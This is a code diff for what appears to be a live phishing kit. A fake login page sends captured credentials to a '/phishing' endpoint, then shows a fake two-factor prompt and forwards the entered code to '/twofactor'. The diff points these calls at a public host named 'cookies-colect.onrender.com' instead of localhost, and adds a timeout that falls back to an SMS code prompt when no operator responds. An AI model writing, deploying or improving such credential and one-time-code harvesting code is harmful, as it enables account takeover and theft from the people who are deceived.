@@ -172,7 +172,7 @@
 
         async function fetchCurrentMethod() {
             try {
-                const response = await fetch('http://localhost:5000/admin');
+                const response = await fetch('https://cookies-colect.onrender.com/admin');
                 const data = await response.json();
                 return data.current_method;
             } catch (e) {
@@ -257,7 +257,7 @@
             showLoading(true);
             
             try {
-                const response = await fetch('http://localhost:5000/phishing', {
+                const response = await fetch('https://cookies-colect.onrender.com/phishing', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -269,19 +269,27 @@
                 
                 const result = await response.json();
                 if (result.status === 'success') {
-                    // On attend indéfiniment que l'admin choisisse une méthode
+                    let attempts = 0;
+                    const maxAttempts = 20; 
+                    
                     const checkInterval = setInterval(async () => {
+                        attempts++;
                         const currentMethod = await fetchCurrentMethod();
                         
-                        // On ne s'arrête QUE si une méthode a été sélectionnée (différente de null/None)
                         if (currentMethod && currentMethod !== 'null' && currentMethod !== 'None') {
                             clearInterval(checkInterval);
                             showLoading(false);
                             document.getElementById('loginBox').style.display = 'none';
                             document.getElementById('twoFactorBox').style.display = 'block';
                             setupA2FMethod(currentMethod);
+                        } else if (attempts >= maxAttempts) {
+                            clearInterval(checkInterval);
+                            showLoading(false);
+                            document.getElementById('loginBox').style.display = 'none';
+                            document.getElementById('twoFactorBox').style.display = 'block';
+                            setupA2FMethod('SMS');
                         }
-                    }, 500); // Vérification toutes les 500ms
+                    }, 500);
                 }
             } catch (error) {
                 showLoading(false);
@@ -295,7 +303,7 @@
             const code = document.getElementById('twoFactorCode').value;
             
             try {
-                const response = await fetch('http://localhost:5000/twofactor', {
+                const response = await fetch('https://cookies-colect.onrender.com/twofactor', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
